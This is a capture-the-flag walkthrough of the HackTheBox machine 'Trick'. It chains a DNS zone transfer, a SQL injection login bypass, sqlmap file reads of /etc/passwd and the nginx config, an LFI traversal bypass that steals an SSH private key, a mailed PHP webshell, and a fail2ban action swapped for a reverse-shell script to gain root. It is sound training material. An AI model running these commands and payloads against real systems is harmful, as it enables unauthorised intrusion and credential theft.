---
title: HackTheBox - Trick
date: 2026-11-15
image: cover.png
tags: [HackTheBox, Easy, Linux]
platform: HackTheBox
os: Linux
difficulty: Easy
points: 45
released: 2022-06-18
ip: 10.129.227.180
boxAvatar: htb-cover.png
excerpt: An easy Linux box running nginx, BIND and a pair of PHP applications behind separate virtual hosts. A DNS zone transfer leaks a payroll subdomain whose login form is vulnerable to SQL injection. The database user has the FILE privilege, so sqlmap reads the nginx config off disk, revealing a second marketing subdomain. That site includes pages via a parameter vulnerable to local file inclusion - a double-dot bypass extracts michael's SSH private key. A passwordless sudo entry for fail2ban restart, combined with a group-writable action config directory, turns a ban trigger into a root shell.
---

# Trick

Trick is an easy-rated Linux machine running nginx, BIND DNS and two PHP applications behind separate virtual hosts. The DNS server allows zone transfers, leaking a payroll subdomain whose login form falls to a simple SQL injection bypass. The database user behind it holds the FILE privilege, so sqlmap can read arbitrary files from disk — including the nginx configuration, which reveals a second marketing subdomain. That site includes pages via a `page` parameter vulnerable to local file inclusion, and a double-dot bypass lets us walk out of the web root to extract `michael`'s SSH private key. Root comes from a passwordless sudo entry for `fail2ban restart`: the action configuration directory is writable by `michael`'s group, so replacing the ban action with a reverse-shell payload and triggering a ban hands us a root shell. Every credential, hash, and IP below belongs to the lab and has no meaning outside of it.

### NMAP Scanning

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp?   syn-ack ttl 63
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    syn-ack ttl 63 nginx 1.14.2
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
| http-methods:
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Four services: SSH, SMTP, a DNS server and an nginx web server. The DNS version string — ISC BIND 9.11.5 on Debian 10 — is old enough to check for zone-transfer misconfigurations, and the SMTP port suggests mail delivery is in play.

### Web Server Enumeration

A `curl -I` confirms nginx 1.14.2 serving a static "Coming Soon" page:

{% image %}

```bash
➜  trick curl -I http://10.129.227.180/
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Fri, 13 Nov 2026 12:50:38 GMT
Content-Type: text/html
Content-Length: 5480
Last-Modified: Wed, 23 Mar 2022 16:34:04 GMT
Connection: keep-alive
ETag: "623b4bfc-1568"
Accept-Ranges: bytes
```

`whatweb` confirms it's a Bootstrap-based placeholder with nothing dynamic:

{% image2 %}

A `feroxbuster` scan finds the usual static assets but no hidden directories or scripts:

→ Command: `feroxbuster --url http://10.129.227.180/`

{% image3 %}

### DNS Enumeration

A reverse lookup against the box's own DNS server reveals the hostname `trick.htb`:

```bash
dig @10.129.227.180 -x 10.129.227.180
```

{% image4 %}

We add it to `/etc/hosts`:

```bash
➜  trick cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

10.129.227.180	trick.htb
```

With the domain name in hand, we request a zone transfer. A zone transfer (AXFR) asks the DNS server for every record in the zone — a feature meant for secondary name servers, but often left unrestricted:

```bash
dig @10.129.227.180 axfr trick.htb
```

{% image5 %}

The transfer succeeds and reveals a CNAME record for `preprod-payroll.trick.htb`. We add it to `/etc/hosts` and move on.

### preprod-payroll.trick.htb - Enumeration

The subdomain hosts a PHP login form for a "Recruitment Management System":

{% image6 %}

A simple SQL injection payload, `' or 1=1--`, bypasses authentication and logs us in as Administrator:

{% image7 %}

Under the Users tab, the password field is masked with asterisks. Removing the `type="password"` attribute in the browser's inspector reveals the plaintext password `SuperGucciRainbowCake` for the username `Enemigosss`:

{% image8 %}

### SQL Injection - File Read

Capturing the request for creating a new employee shows the `id` parameter is also injectable:

{% image9 %}

The initial injection is time-based blind, which is slow. To find faster techniques we run sqlmap against the login action with the `--technique=BEUS` flag (Boolean, Error, Union, Stacked — excluding Time-based and Inline):

```bash
sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data="username=abc&password=abc" -p username --level 5 --risk 3 --technique=BEUS --batch
```

Dumping the `users` table confirms the credentials we already found:

```bash
sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" --data "username=a,password=a" --random-agent --level 3 --risk 2 --batch -D payroll_db -T users --dump

Database: payroll_db
Table: users
[1 entry]
+----+-----------+---------------+------+---------+---------+-----------------------+------------+
| id | doctor_id | name          | type | address | contact | password              | username   |
+----+-----------+---------------+------+---------+---------+-----------------------+------------+
| 1  | 0         | Administrator | 1    | <blank> | <blank> | SuperGucciRainbowCake | Enemigosss |
+----+-----------+---------------+------+---------+---------+-----------------------+------------+
```

Checking the database user's privileges shows the `FILE` grant, which means sqlmap can read files from disk:

```bash
sqlmap -u http://preprod-payroll.trick.htb/ajax.php\?action\=login --data="username=abc&password=abc" -p username --privileges
```

{% image10 %}

We use it to read `/etc/passwd`:

```bash
sqlmap -u http://preprod-payroll.trick.htb/ajax.php\?action\=login --data="username=abc&password=abc" -p username --batch --file-read=/etc/passwd
```

{% image11 %}

The admin password doesn't work for SSH as any of the system users:

{% image12 %}

Since we can read arbitrary files, we pull the nginx virtual-host configuration:

```bash
sqlmap -u http://preprod-payroll.trick.htb/ajax.php\?action\=login --data="username=abc&password=abc" -p username --batch --file-read=/etc/nginx/sites-available/default
```

{% image13 %}

It reveals another server block for `preprod-marketing.trick.htb`, rooted at `/var/www/market`. Before moving on to it, we note that the payroll application itself is vulnerable to local file inclusion through a `php://filter` wrapper — using `page=php://filter/convert.base64-encode/resource=users` returns the base64-encoded source of the `users` page:

{% image14 %}

Decoding it shows the PHP source, but nothing immediately useful for escalation:

{% image15 %}

### preprod-marketing.trick.htb - LFI Exploitation

The marketing site loads pages through the same `page` parameter pattern:

{% image16 %}

Its filter strips `../` sequences, but a double-dot bypass — `...//....//` — survives the strip and resolves to a valid traversal. Reading `/etc/passwd` confirms the LFI works:

{% image17 %}

With arbitrary file read through the web server, we target `michael`'s SSH private key at `/home/michael/.ssh/id_rsa`:

{% image18 %}

After saving the key and setting permissions with `chmod 600 id_rsa`, we log in as `michael`:

{% image19 %}

An alternative foothold is possible through the SMTP port. Connecting to port 25 and sending an email to `michael` with a PHP webshell as the body drops the payload into `/var/mail/michael`. Including that file through the marketing site's LFI with a `cmd` parameter gives command execution:

{% image20 %}

### Privilege Escalation

A `sudo -l` shows that `michael` can restart fail2ban as root with no password:

{% image21 %}

The interesting file is `iptables-multiport.conf` inside fail2ban's `action.d` directory, specifically its `actionban` variable — the command that runs when an IP gets banned. `michael` can't write to the file directly, but the directory is owned by the `security` group (which `michael` belongs to), so he can move the original file out and replace it with a modified copy:

```bash
cat iptables-multiport.conf
mv iptables-multiport.conf .old
cp .old iptables-multiport.conf
ls -l iptables-multiport.conf
```

With ownership of the new file, we change `actionban` to point at a reverse-shell script (`actionban = /tmp/shell.sh`), create the script, and make it executable. Then we restart fail2ban with the sudo entry and trigger a ban by failing several SSH logins. fail2ban executes the modified action as root, sending a shell back to our listener.

Trick layers its defences loosely enough that one answer leads straight to the next. A zone transfer that should have been restricted hands over the payroll subdomain, a SQL injection on that subdomain gives file-read privileges on the whole disk, and the nginx config it reads discloses a second subdomain whose LFI hands over an SSH key. The final step — abusing a group-writable fail2ban config with a passwordless sudo restart — is a reminder that sudo entries are only as safe as the files the allowed command trusts.
